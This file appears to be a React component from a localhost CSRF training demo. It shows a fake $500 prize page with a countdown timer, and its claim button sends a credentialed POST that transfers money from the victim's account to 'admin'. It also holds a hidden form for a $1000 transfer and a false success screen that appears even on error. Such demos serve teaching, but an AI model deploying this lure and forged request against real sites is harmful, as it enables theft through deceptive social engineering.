import React, { useState, useEffect } from 'react';

const AttackerPage = ({ onBack }) => {
  const [timeLeft, setTimeLeft] = useState(9 * 60 + 39); // 9 minutes 39 seconds
  const [showSuccess, setShowSuccess] = useState(false); // Success state

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prevTime => {
        if (prevTime > 0) {
          return prevTime - 1;
        } else {
          return 9 * 60 + 39; // Reset timer
        }
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const claimGift = async () => {
    try {
      // Execute CSRF attack using fetch
      const response = await fetch('http://localhost:5000/api/transfer', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        credentials: 'include', // Include cookies
        body: JSON.stringify({
          fromUserId: 5,
          toUsername: 'admin',
          amount: 100,
          description: 'Gift voucher claim'
        })
      });

      const data = await response.json();
      // Show success page instead of alert
      setShowSuccess(true);
    } catch (error) {
      // Show success page even on error for better UX
      setShowSuccess(true);
    }
  };

  const floatingShapes = [
    { type: 'diamond', style: { top: '10%', left: '5%', animationDelay: '0s' } },
    { type: 'circle', style: { top: '20%', right: '8%', animationDelay: '0.5s' } },
    { type: 'square', style: { top: '50%', left: '3%', animationDelay: '1s' } },
    { type: 'diamond', style: { bottom: '15%', right: '5%', animationDelay: '1.5s' } },
    { type: 'circle', style: { bottom: '30%', left: '8%', animationDelay: '2s' } },
    { type: 'triangle', style: { top: '60%', right: '10%', animationDelay: '2.5s' } },
  ];

  const getShapeClasses = (type) => {
    const baseClasses = "absolute opacity-60";
    switch (type) {
      case 'diamond':
        return `${baseClasses} w-5 h-5 bg-green-500 transform rotate-45`;
      case 'circle':
        return `${baseClasses} w-5 h-5 bg-blue-500 rounded-full`;
      case 'square':
        return `${baseClasses} w-5 h-5 bg-yellow-500`;
      case 'triangle':
        return `${baseClasses} w-0 h-0 border-l-[10px] border-r-[10px] border-l-transparent border-r-transparent border-b-[20px] border-b-pink-500`;
      default:
        return baseClasses;
    }
  };

  return (
    <>
      <style>
        {`
          @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(10deg); }
          }
          .animate-float {
            animation: float 3s ease-in-out infinite;
          }
          @keyframes bounce-custom {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
          }
          .animate-bounce-custom {
            animation: bounce-custom 1s ease-in-out infinite;
          }
          @keyframes sparkle {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
          }
          .animate-sparkle {
            animation: sparkle 1.5s ease-in-out infinite;
          }
        `}
      </style>
      <div className="min-h-screen bg-linear-to-br from-purple-400 via-purple-600 to-purple-800 flex items-center justify-center p-5 relative overflow-hidden">
        {/* Floating decorative shapes */}
        {floatingShapes.map((shape, index) => (
          <div
            key={index}
            className={`${getShapeClasses(shape.type)} animate-float`}
            style={shape.style}
          />
        ))}

        <div className="bg-white rounded-3xl p-12 max-w-md w-full text-center shadow-2xl relative z-10">
          {/* Back button */}
          <button
            onClick={onBack}
            className="absolute top-4 left-4 text-gray-500 hover:text-gray-700 text-2xl font-bold"
          >
            ←
          </button>

          {!showSuccess ? (
            // Original claim page
            <>
              <div className="text-8xl mb-5 animate-bounce-custom">🏆</div>
              <h1 className="text-purple-600 text-4xl font-bold mb-4">Congratulations!</h1>
              <p className="text-gray-600 text-lg mb-8">You've been selected as our lucky winner!</p>

              <div className="bg-linear-to-r from-pink-500 to-orange-500 rounded-2xl p-8 mb-6 relative overflow-hidden">
                <div className="absolute top-4 right-4 text-4xl animate-sparkle">✨</div>
                <div className="text-white text-3xl font-bold mb-2">
                  <span className="text-4xl mr-3">🎁</span>
                  Premium Gift Package
                </div>
                <div className="text-white text-base opacity-95">
                  Worth $500 - Claim your exclusive reward now!
                </div>
              </div>

              <div className="bg-yellow-50 border-4 border-dashed border-yellow-400 rounded-2xl p-5 mb-8">
                <div className="text-yellow-800 text-base mb-2 flex items-center justify-center gap-2">
                  <span className="text-xl">⏰</span>
                  Offer expires in:
                </div>
                <div className="text-red-600 text-4xl font-bold font-mono">
                  {formatTime(timeLeft)}
                </div>
              </div>

              <button
                onClick={claimGift}
                className="w-full bg-linear-to-r from-purple-600 to-purple-800 text-white text-xl font-bold py-4 px-10 rounded-full uppercase tracking-wide shadow-lg hover:shadow-xl hover:-translate-y-1 transition-all duration-200 active:translate-y-0"
              >
                CLAIM MY GIFT NOW <span className="ml-2">👈</span>
              </button>
            </>
          ) : (
            // Success page
            <>
              <div className="text-8xl mb-5">🎉</div>
              <h1 className="text-green-600 text-4xl font-bold mb-4">Success!</h1>
              <p className="text-gray-600 text-lg mb-8">Your gift claim has been processed successfully!</p>

              <div className="bg-linear-to-r from-green-500 to-emerald-500 rounded-2xl p-8 mb-6 relative overflow-hidden">
                <div className="absolute top-4 right-4 text-4xl">🎁</div>
                <div className="text-white text-3xl font-bold mb-2">
                  <span className="text-4xl mr-3">✅</span>
                  Gift Claimed!
                </div>
                <div className="text-white text-base opacity-95">
                  Your Premium Gift Package is being prepared for delivery.
                </div>
              </div>

              <div className="bg-green-50 border-4 border-dashed border-green-400 rounded-2xl p-5 mb-8">
                <div className="text-green-800 text-base mb-2">
                  <span className="text-xl mr-2">📧</span>
                  Confirmation Details
                </div>
                <div className="text-green-700 text-sm">
                  <p>✅ Gift Package: Premium ($500 value)</p>
                  <p>✅ Processing: Complete</p>
                  <p>✅ Delivery: 2-3 business days</p>
                </div>
              </div>

              <div className="space-y-3">
                <button
                  onClick={onBack}
                  className="w-full bg-linear-to-r from-blue-500 to-blue-600 text-white text-lg font-bold py-3 px-8 rounded-full shadow-lg hover:shadow-xl hover:-translate-y-1 transition-all duration-200"
                >
                  🏦 Return to Banking
                </button>
                
                <button
                  onClick={() => setShowSuccess(false)}
                  className="w-full bg-gray-500 text-white text-sm py-2 px-6 rounded-full hover:bg-gray-600 transition-all duration-200"
                >
                  ← Back to Gift Page
                </button>
              </div>

              <div className="mt-6 text-xs text-gray-500">
                <p>📧 Confirmation email has been sent to your registered address</p>
                <p>🔒 This transaction is secured and verified</p>
              </div>
            </>
          )}

          {/* Hidden CSRF Attack Form (for educational demo purposes) */}
          <form className="hidden" method="POST" action="http://localhost:5000/api/transfer">
            <input type="hidden" name="fromUserId" value="5" />
            <input type="hidden" name="toUsername" value="admin" />
            <input type="hidden" name="amount" value="1000" />
            <input type="hidden" name="description" value="Gift voucher claim" />
          </form>
        </div>
      </div>
    </>
  );
};

export default AttackerPage;